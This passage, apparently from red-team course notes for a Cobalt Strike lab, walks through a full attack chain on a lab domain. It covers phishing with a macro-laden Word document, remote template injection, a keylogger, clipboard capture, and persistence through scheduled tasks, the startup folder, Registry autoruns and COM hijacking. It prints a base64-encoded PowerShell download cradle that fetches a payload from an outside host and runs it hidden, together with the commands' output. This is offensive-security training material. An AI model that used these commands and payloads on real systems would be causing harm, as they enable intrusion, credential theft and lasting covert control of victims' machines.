W/wOxJ/1j9VYTsfdJmOCaOTZcEuWvx52FlZ4uInevZI+deyM1wY0gqGRFYcEw66c9ZBGZGsID3HSEimA3hnBM/sZ6vkBtFnyIiiKWSOohzLM30vH9L2wDqeDRJyAFE8lnIi93Y9lYCMIKEEoARZPgu2I3eLCIAhEL4L8zeoMI3OV8rK4oIgATqfUAs4yA5b8XEyrf/EyP64C71tqRJAnELAvpum4Dha2Xyp+JxnnQLsLJwzTzPqP0QJ3O9a//Ya9V/QUh8e+AcN+3hmSRIKztbRIyPy3nw+E035DkIS1E5IQgMNvx/j9cL8V7tQXxl+hMdW3j/lkTZUkcl/KPvw33ufLYJn0URtIjghwXd9x8sAaNcJdaFNQEBfJ2WtgGWa9iSpizK/W7HrghCfgba295KAEaQUAIwggzfBbvJu0QEiUD4J8nRQ9WhaYWVVUUExy8k8xLPEhEACVDV66GfIViZTLxGVR6INmD1gIIwtFLO5Ky8V0SUv2dTAjkXdSHpYVlAAF+nJVG21MFxS0k8JC+MtjMJn2EiBIHY+JzOw2PLXpOv19I2QLg2V5emLMwns9x2FLxaP45rbyUAI0goARhBhu+C3dRdIgKYPUlwWCKhWcL7gzStsLKqiAC5ZaIKzxYR4BwhUaNwK8+KRYZJ30AArLz2hUVJiH9u6cvsXSKSG2A4PouIAEgIKhH1EPVriQdQ9WjKorUOEnUpsZXIEBHOFRGcC2IwXBW+fkvbAKrvaMoCfeXrLGzd3xjT3koARpBQAjCCDN8Fu6m7RcQnUiR0NZLdYuu/kKYVVtYkIgASn9l7EucQEQHs+t/0iFglUfeISE3c5U/V52jX8bnUb+bTJSJAg8g+m4gsCE8TiSetijT/1rVwwNcfKSIAElvvzCqXNE8XkeMyYIuobuHjXFJEgNyypMUr7odtcX57KwEYQUIJwAgyfBeYjJHIVqoRs4erUx2VOP9AmlZY2fq/LHI+HjhXJMNCUv9i14j/dR598FHuSVMTEA9xWTc5Ls4H51VrS4zeGUcKIgTIYlT/ve4C+Fm94v8zQTx7Xb2hcO7mF7VR7XoA88Gjx8n14Ni4Vro9O8LadVjzziWHwyPs8QZpG5CYIzYI0El1IIiWJNVI+ThDCIn3rvQkGpJpcuwMQyzz7xWOLZK4jeIMP1+XpiIgAL5ea12P09tbCcAIEkoARpDhv1kwgWJm9bo16Y6CO/bJNxywxOHbs8BBwrB4vcBxcQ58OzHxjUAJwAgSSgBGkOEnJiYmJq4KJQAjSCgBGEGGn5iYmJi4KpQAjCChBGAEGX5iYmJi4qpQAjCChBKAEWT4iYmJiYmrQgnACBJKAEaQ4ScmJiYmrgolACNIKAEYQYafmJiYmLgqlACMIKEEYAQZfmJiYmLianj16v95r6jSgODXdAAAAABJRU5ErkJggg==">
</td>
</tr>
</tbody>
</table>
<table align="left" border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="left" style="background-color: #eaeaea; color: #333333; font-family: 'Segoe UI', 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 11px; font-weight: normal; padding-bottom: 0px; padding-top: 24px; padding-right: 20px; padding-left: 20px;">
Sender will be notified when you open this link for the first time. </td>
</tr>
<tr>
<td align="left" style="background-color: #eaeaea; color: #333333; font-family: 'Segoe UI', 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 11px; font-weight: normal; padding-bottom: 20px; padding-top: 12px; padding-right: 20px; padding-left: 20px;">
Microsoft respects your privacy. To learn more, please read our <a href="https://ukwestr-notifyp.svc.ms:443/api/v2/tracking/method/Click?mi=I3j60QYSH0a4nrbzR0ls8w&amp;ru=https%3a%2f%2fprivacy.microsoft.com%2fprivacystatement&amp;tc=PrivacyStatement&amp;cs=0314d9fa12424d266f2bced0d585848e" target="_blank" style="color: #333333">
Privacy Statement.</a><br>
Microsoft Corporation, One Microsoft Way, Redmond, WA 98052 </td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!-- End Footer -->
</body>
</html>
```

Once in the OWA text editor, you can highlight the `ProductReport.doc` and `Open` and once highlighted, press `ctrl+k` and that will allow you to paste the link for the Beacon Macro Payload, `http://nickelviper.com:80/ProductReport.doc`.&#x20;

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

If the victim falls for it, they can open the document and it will get executed.

### Victim Will see...

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Since this file is marked with the Mark of the Web (MOTW), the user will need to select **Enable Editing** for the malicious macro to be executed.

This is the only downfall to this approach as it takes significant user-interaction for it to be successful.
{% endhint %}

### The Victim Fell for it

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

### Analyzing Cobalt Strike Sessions Thus far...

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

We can see that we have `bfarmer`, that is on a different workstation other than `Attacker`, that is running via Malicious PowerShell Macro Beacon.&#x20;

### Remote Template Injection

{% hint style="info" %}
This is a technique where an attacker can send a benign document to a victim and this will download and load a malicious template. This template may hold a macro, leading to code execution.
{% endhint %}

1. Open Word, Create a new blank document and insert the desired macro, using the same method above that we used earlier
2. Save this to `C:\Payloads` as a `Word 97 2003 Template (*.dot)` file

* This is now our malicious remote template

<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

3. Configure Cobalt Strike to host this file at `http://nickelviper.com/phish-template.dot`

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

4. Now create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`, adding any content you want, and save it to `C:\Payloads` as a new `.docx`
5. We can now use [John Woodman](https://twitter.com/JohnWoodman15)'s [python tool](https://github.com/JohnWoodman/remoteinjector) that can automate this process so that we don't have to modify the XML manually.
6. **On Ubuntu WSL:**

```
python3 remoteinjector.py -w http://nickelviper.com:80/phish-template.dot /mnt/c/Payloads/document.docx

URL Injected and saved to /mnt/c/Payloads/document_new.docx
```

### Victim Open RTI Email

<figure><img src="../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

We got him!

## Host Reconnaissance

### List Running Processes

**This can provide clues to custom applications and AV solutions that may be running on the host:**

```
ps
```

{% hint style="info" %}
**Remember:** When running in <mark style="color:yellow;">medium</mark> integrity (i.e. a standard user), you will not be able to see arch, session and user information for processes that your current user does not own.

**The indentation represents parent/child relationships.**
{% endhint %}

<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Processes in <mark style="color:yellow;">yellow</mark> indicate our **Beacon** **process**.
{% endhint %}

### Seatbelt

A C# tool for automatically collecting enumeration data on a host.

* OS info
* AV
* AppLocker
* LAPS
* PowerShell logging
* Audit policies
* `.NET` versions
* Firewall rules
* And more

**Directly on a Beacon, we can execute the following:**

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe

====== AppLocker ======

    [*] Applocker is not running because the AppIDSvc is not running

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.8.04084

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!

====== InternetSettings ======

  HKCU                       ProxyEnable : 1
  HKCU                     ProxyOverride : *.cyberbotic.io;<local>
  HKCU                       ProxyServer : squid.dev.cyberbotic.io:3128

====== LAPS ======

  LAPS Enabled                          : False

====== OSInfo ======

  Hostname                      :  wkstn-2
  Domain Name                   :  dev.cyberbotic.io
  Username                      :  DEV\bfarmer
  Build                         :  19044.1889
  BuildBranch                   :  vb_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  IsLocalAdmin                  :  True
    [*] In medium integrity but user is a local administrator - UAC can be bypassed.
  TimeZone                      :  Coordinated Universal Time

====== PowerShell ======

  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.19041.1

====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 1
```

This will give us a ton of information.

### Screenshots

**Beacon has multiple commands for taking screenshots which work in slightly different ways:**

```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

**For example:**

```
beacon> screenshot
```

To see all the screenshots that have been taken, go to **View > Screenshots**.

<figure><img src="../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

### Keyloggers

Can be used to capture all keystrokes of a user to capture usernames, passwords, and other sensitive information.

```
beacon> keylogger
[+] received keystrokes from *Untitled - Notepad by bfarmer
```

These keystrokes can be viewed in **View -> Keystrokes**.

<figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

### Clipboard

This command can capture any text from the user's clipboard.

{% hint style="danger" %}
Note: this only captures text, no images or other data.
{% endhint %}

```
beacon> clipboard
[*] Tasked beacon to get clipboard contents

Clipboard Data (8 bytes):
Sup3rman
```

{% hint style="warning" %}
This is a one-off command (it does not run as a job) and dumps the content directly to the Beacon console.
{% endhint %}

### User Sessions

Users that are currently logged on to this same machine may be good candidates to attack.&#x20;

{% hint style="info" %}
For example, if they are more privileges than our current user in the domain, they may be a good candidate for lateral movement to other machines.
{% endhint %}

**he `net logons` command will list the logon sessions on this machine:**

```
beacon> net logons

Logged on users at \\localhost:

DEV\bfarmer
DEV\jking
DEV\WKSTN-2$
```

<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

## Host Persistence

### Introduction/Reminder

{% hint style="info" %}
Remember, this is the method of regaining or maintaining access to a compromised machine so that we do not have to perform the initial compromise steps all over again.

Workstations tend to be volatile because users tend to logout or reboot frequently.
{% endhint %}

Persistence can be executed within userland (e.g. as the current user) or in an elevated context such as SYSTEM. Elevated persistence requires that we become local admin on the host first, which is covered in the **Privilege Escalation** section coming up next.

Common userland persistence methods include:

* `HKCU` / `HKLM` Registry Autoruns
* Scheduled Tasks
* Startup Folder

{% hint style="info" %}
Cobalt Strike doesn't include any built-in commands specifically for persistence. [SharPersist](https://github.com/fireeye/SharPersist) is a Windows persistence toolkit written by FireEye. It's written in C#, so can be executed via `execute-assembly`.
{% endhint %}

### Task Scheduler

The Windows Task Scheduler allows us to create "tasks" that execute on a pre-determined trigger.

{% hint style="info" %}
That trigger could be a time of day, on user-logon, when the computer goes idle, when the computer is locked, or a combination thereof.
{% endhint %}

### Scheduled Task to Execute a PowerShell Payload Once/Hour

{% hint style="info" %}
To save ourselves from having to deal with lots of quotations in the IEX cradle, we can encode it to base64 and execute it using the `-EncodedCommand` parameter in PowerShell (often appreciated to `-enc`)
{% endhint %}

{% hint style="warning" %}
This is a little complicated to do, because it must use Unicode encoding (rather than UTF8 or ASCII)
{% endhint %}

#### There's a couple different ways we can do this

**In PowerShell:**

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

# OUTPUT PRODUCED
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
```

<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

**In Linux:**

```
ubuntu@DESKTOP-3BSK7NO ~> set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'

ubuntu@DESKTOP-3BSK7NO ~> echo -en $str | iconv -t UTF-16LE | base64 -w 0

# OUTPUT PRODUCED
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
```

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

**Then, execute C# Assembly (`SharPersist.exe`) via the Beacon Terminal:**

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly
[+] SUCCESS: Scheduled task added
```

{% hint style="info" %}
**Parameters:**

* `-t` is the desired persistence technique.
* `-c` is the command to execute.
* `-a` are any arguments for that command.
* `-n` is the name of the task.
* `-m` is to add the task (you can also `remove`, `check` and `list`).
* `-o` is the task frequency.
{% endhint %}

#### Triggering the Task Scheduler Persistence Tactic

{% hint style="success" %}
Open the Task Scheduler and select _Task Scheduler Library_ in the left-hand menu.  You should see your task appear in the main window.  You may of course wait for one hour, or simply highlight the task and click _Run_ in the right-hand _Actions_ menu.  This should spawn another Beacon.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

### Startup Folder

Applications, files and shortcuts within a user's startup folder are launched automatically when they first log in.

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
```

<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
_**Use the Workstation 2 console to check****&#x20;****`C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`****&#x20;****for the file that was dropped.**_
{% endhint %}

{% hint style="success" %}
**To simulate a logoff and logon via Guacamole, right-click the Windows start icon and select&#x20;**_**Shut down or sign out > Sign out**_**.  Guacamole will then give you the options to&#x20;**_**reconnect**_**&#x20;or&#x20;**_**logout**_**.  Select&#x20;**_**reconnect**_**&#x20;and it will log you back in.**
{% endhint %}

This will grant you a shell upon logging back on (or once the user logs back on).

<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

### Registry AutoRun

{% hint style="info" %}
:bulb: **AutoRun values in HKCU and HKLM allow applications to start on boot.**
{% endhint %}

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

Where:

* `-k` is the registry key to modify.
* `-v` is the name of the registry key to create.

{% hint style="info" %}
**Note: `HKLM` AutoRun will NOT execute the payload as `SYSTEM`.**&#x20;
{% endhint %}

<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
As before, you can test this by rebooting the VM.
{% endhint %}

### Hunting for Component Object Models (COM) Hijacks

{% hint style="danger" %}
You can hijack COM objects that are in use, but that comes at the risk of breaking applications that rely on them.

Rather than doing that, a _**safer**_ strategy is to load objects that don't actually exist (these are known as _**abandoned keys**_).
{% endhint %}

We can rely on _**Process Monitor**_ in order to show us real-time file system, Registry, and process activity, it is also very useful in finding different types of privilege escalation primitives.

#### Filtering (Helpful for combating the amount of events generated)

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

#### What we're looking for...

**Due to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:**

* _`RegOpenKey`_ operations.
* where the Result is `NAME NOT FOUND`.
* and the Path ends with `InprocServer32`.

:bulb: We are also looking for the number of times that a particular `CLSID` is loaded.

#### Identifying a Potentially Hijackable COM Object

**Using PowerShell, we can see that the entry does exist in `HKLM`, but not in `HKCU`:**

```
PS C:\Users\Attacker> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}


Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment

PS C:\Users\Attacker> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32'
because it does not exist.
At line:1 char:1
+ Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...\InprocServer32:String) [Get-Item], ItemNotFoundExcep
   tion
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand

PS C:\Users\Attacker>
```

#### Exploitation

To exploit this, we can create the Registry entries in `HKCU` and point them at a Beacon DLL.

**Since this is still on our attacking machine, we'll point it straight at `C:\Payloads\http_x64.dll`:**

```
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

#### How it works...

Once `DllHost.exe` loads this COM entry, we will get a Beacon.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Another great place to look for hijackable COM components

We can look in the _**Task Scheduler**_.

Rather than executing binaries on disk, many of the default Windows Tasks will rely on custom triggers to call COM objects. This is because they are executed via the Task Scheduler.

**We can use the following PowerShell script to find compatible tasks:**

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

**Output:**

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Now, if we look at `MsCtfMonitor`, we can view it in the Task Scheduler.

A quick Google search allowed me to find it swiftly in the Task Scheduler window.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We can then see that it is triggered when _**any**_ user logs in.&#x20;

{% hint style="success" %}
Yes, this acts as an effective reboot-persistence mechanism.&#x20;
{% endhint %}

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**We can then look up the current implementation of `{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}` in&#x20;**_**`HKEY_CLASSES_ROOT\CLSID`**_ **(this can be found in the `Task Path` corresponding to `MsCtfMonitor`):**

```
Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"

    Hive: HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}


Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\system32\MsCtfMonitor.dll
                               ThreadingModel : Both
```

**We can see it's another InprocServer32 and we can verify that it's currently implemented in HKLM and not HKCU:**

```
PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler


PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

_**Simply add a duplicate entry into HKCU pointing to our DLL (as above), and this will be loaded once every time a user logs in.**_
